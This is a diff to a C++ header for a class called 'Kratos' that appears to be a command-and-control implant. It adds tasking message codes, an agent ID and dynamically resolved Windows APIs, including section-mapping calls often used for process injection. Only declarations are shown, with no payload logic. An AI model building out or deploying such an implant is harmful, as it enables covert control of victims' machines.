@@ -22,6 +22,12 @@
 
 #define TO_DWORD(x) ((DWORD)(ULONG_PTR)(x))
 #define ALLOC_ARGS LMEM_FIXED | LMEM_ZEROINIT
+#define MSG_GETTASK  0x1
+#define MSG_REGISTER 0x2
+#define MSG_OUTPUT   0x3
+
+
+#define RESP_NO_TASKS 0xa1
 
 
 #define DECL( x ) decltype( x ) * x
@@ -34,29 +40,32 @@ public:
 	struct Apis {
 
 		// advapi
-		DECL( GetUserNameW );
-		DECL( GetComputerNameExW );
+		DECL(GetUserNameW);
+		DECL(GetComputerNameExW);
 
 
 		// k32
-		DECL( LoadLibraryA );
-		DECL( GetProcAddress );
-		DECL( CloseHandle );
-		DECL( LocalReAlloc );
-		DECL( LocalAlloc );
-		DECL( LocalFree );
-		DECL( GetUserDefaultGeoName );
-		DECL( GetTickCount );
+		DECL(LoadLibraryA);
+		DECL(GetProcAddress);
+		DECL(CloseHandle);
+		DECL(LocalReAlloc);
+		DECL(LocalAlloc);
+		DECL(LocalFree);
+		DECL(GetUserDefaultGeoName);
+		DECL(GetTickCount);
+		DECL(CreateFileA);
 
 
 		// ntdll
-		DECL( RtlRandomEx );
-		DECL( NtOpenProcessToken );
-		DECL( NtQueryInformationToken );
-		DECL( NtQueryInformationProcess );
+		DECL(RtlRandomEx);
+		DECL(NtOpenProcessToken);
+		DECL(NtQueryInformationToken);
+		DECL(NtQueryInformationProcess);
+		DECL(NtCreateSection);
+		DECL(NtMapViewOfSection);
 	};
 
-	struct Modules {
+	struct Dlls {
 		HMODULE kernel32;
 		HMODULE ntdll;
 		HMODULE Advapi32;
@@ -71,12 +80,13 @@ public:
 
 	Settings settings;
 	Apis   apis;
-	Modules modules;
-	BOOL Register( );
-	BOOL LoadConfig( );
-	BOOL Init( );
-	BOOL LoadApis( );
-	BOOL Run( );
+	Dlls dlls;
+	INT32 AgentID;
+	BOOL Register();
+	BOOL LoadConfig();
+	BOOL Init();
+	BOOL LoadApis();
+	BOOL Run();
 };
 
 extern Kratos* kratos;
